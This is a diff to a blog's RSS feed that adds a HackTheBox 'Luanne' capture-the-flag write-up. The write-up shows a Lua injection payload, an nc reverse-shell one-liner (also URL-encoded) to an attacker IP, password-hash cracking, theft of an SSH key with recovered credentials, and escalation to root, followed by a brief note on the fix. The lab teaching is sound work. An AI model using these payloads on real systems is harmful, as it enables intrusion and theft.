@@ -5,12 +5,137 @@
     <link>https://mohamed-elleuch.me/tag/hackthebox/</link>
       <atom:link href="https://mohamed-elleuch.me/tag/hackthebox/index.xml" rel="self" type="application/rss+xml" />
     <description>HackTheBox</description>
-    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright © Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 06 Mar 2021 00:00:00 +0000</lastBuildDate>
+    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright © Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 27 Mar 2021 00:00:00 +0000</lastBuildDate>
     <image>
       <url>https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png</url>
       <title>HackTheBox</title>
       <link>https://mohamed-elleuch.me/tag/hackthebox/</link>
     </image>
+    
+    <item>
+      <title>HackTheBox - Luanne Writeup</title>
+      <link>https://mohamed-elleuch.me/writeups/htb-luanne/</link>
+      <pubDate>Sat, 27 Mar 2021 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/writeups/htb-luanne/</guid>
+      <description>&lt;h1 id=&#34;p-stylecolordarkredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:DArkRED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.218 -v
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;nmap.png&#34;&gt;
+&lt;p&gt;As we can see above, We have 3 PORTS open:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Port 22 running OpenSSH 8.0 ; Recent version, no need waste time on it&lt;/li&gt;
+&lt;li&gt;Port 80 running nginx ; robots.txt &amp;ndash;&amp;gt; /weather&lt;/li&gt;
+&lt;li&gt;Port 9001 running Medusa httpd 1.12 ; If we were on linux i think this should be something interesting&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Skipping the gobuster part, it will only show us robots.txt. I do prefer Dirb when it comes to directory bruteforcing&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;p-stylecolorgreendirb-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Dirb scan &lt;/p&gt;&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;You can clone the SecLists repo from here &lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We already got  &lt;strong&gt;/weather/&lt;/strong&gt; from the nmap results, let&amp;rsquo;s see enum more&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dirb http://10.10.10.218/weather/ /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -R
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;dirb.png&#34;&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolordarkredfootholdp&#34;&gt;&lt;p style=&#34;color:DArkRED&#34;&gt;Foothold&lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;From our previous scans we were able to find&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;http://10.10.10.218/weather/forecast/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;forecast.png&#34;&gt;
+Let&#39;s try it as a GET param
+&lt;img src=&#34;get.png&#34;&gt;
+Adding a &lt; &#39; &gt; causes an error
+&lt;img src=&#34;luaerror.png&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Skipping the SQL Injection part as it got me nothing&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Let&amp;rsquo;s now try if we have any potential code injection.
+Basically, The idea is to end the current lua command and inject.
+Another think to note for lua a comment starts anywhere with a double hyphen ( &amp;ndash; ) and runs until the end of the line.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s first try this payload&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;/weather/forecast?city=London&#39;);print(&amp;quot;\nhi&amp;quot;)--
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;print.png&#34;&gt;
+That worked! Let&#39;s try if we can use system commands
+&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;/weather/forecast?city=London&#39;);print(&amp;quot;\n&amp;quot;);os.execute(&amp;quot;id&amp;quot;)--
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;id.png&#34;&gt;
+&lt;p&gt;That worked aswell! Let&amp;rsquo;s now get a reverse shell&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Final url encoded payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;/weather/forecast?city=%4c%6f%6e%64%6f%6e%27%29%3b%70%72%69%6e%74%28%22%5c%6e%22%29%3b%6f%73%2e%65%78%65%63%75%74%65%28%22%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%39%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66%22%29%2d%2d
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s execute it and get a shell on the box
+&lt;img src=&#34;foothold.png&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolordarkreduser-privescp&#34;&gt;&lt;p style=&#34;color:darkred&#34;&gt;User PrivEsc&lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;We can see that we have the default  &lt;strong&gt;.htpasswd&lt;/strong&gt; file which can contain potential passwords
+&lt;img src=&#34;pass.png&#34;&gt;
+Let&amp;rsquo;s see what we got there
+&lt;img src=&#34;webapi.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo &amp;quot;$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0&amp;quot; &amp;gt; hash ; john hash -w=/opt/rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And we cracked it!
+&lt;img src=&#34;best.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s start by viewing the running processes&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;You need to specify the w tag to view the whole command&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;mich.png&#34;&gt;
+We can see that the user **r.michaels** is running a local server at port 3001! Let&#39;s exploit this to get his private SSH key!
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl http://127.0.0.1:3001/~r.michaels/id_rsa
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;But we get 401 Unauthorized page!&lt;/p&gt;
+&lt;img src=&#34;unauth.png&#34;&gt;
+Let&#39;s try the credentials that we got earlier
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl http://127.0.0.1:3001/~r.michaels/id_rsa --user webapi_user:iamthebest
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;ssh.png&#34;&gt;
+And it worked! Let&#39;s login to the user
+&lt;img src=&#34;user.png&#34;&gt;
+&lt;p&gt;And we grab that user flag!&lt;/p&gt;
+&lt;h1 id=&#34;p-stylecolordarkredroot-privescp&#34;&gt;&lt;p style=&#34;color:darkred&#34;&gt;Root PrivEsc&lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;An interesting backups file which contains an encrypted tar.gz file&lt;/p&gt;
+&lt;img src=&#34;back.png&#34;&gt;
+&lt;p&gt;Because we&amp;rsquo;re on an OpenBSD box, we&amp;rsquo;re gonna use netpgp to decrypt then extract its content&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=backup.tar.gz
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;tar.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s check that .htpasswd file!
+&lt;img src=&#34;root.png&#34;&gt;
+&lt;code&gt;webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s crack this password with john!&lt;/p&gt;
+&lt;img src=&#34;pass_root.png&#34;&gt;
+&lt;p&gt;&lt;code&gt;littlebear&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s try to switch to the root user with this password!&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.vultr.com/docs/introduction-to-doas-on-openbsd&#34;&gt;https://www.vultr.com/docs/introduction-to-doas-on-openbsd&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;doas su
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;roott.png&#34;&gt;
+&lt;p&gt;And we rooted the box!&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolordarkredbonus-sectionp&#34;&gt;&lt;p style=&#34;color:darkred&#34;&gt;Bonus Section&lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s see what caused the lua injection!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat /home/r.michaels/devel/webapi/weather.lua
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Going through the code we can see what just exploited!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;httpd.write(&#39;&amp;quot;error&amp;quot;: &amp;quot;unknown city: &#39; .. city .. &#39;&amp;quot;}&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;basically what we have done is&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;httpd.write(&#39;&amp;quot;error&amp;quot;: &amp;quot;unknown city: &#39;hi&#39;);os.execute(&amp;quot;id&amp;quot;) -- &#39;&amp;quot;}&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To avoid this kind of injection, we should validate and sanitize the &amp;ldquo;city&amp;rdquo; input. Scanning the city variable for escape characters and special symbols, making a blacklist for any suspicious word {os,execute,print,&amp;hellip;}
+Or just by removing the &amp;lsquo;.. city ..&amp;rsquo; part!&lt;/p&gt;
+&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
+</description>
+    </item>
     
     <item>
       <title>HackTheBox - Passage Writeup</title>
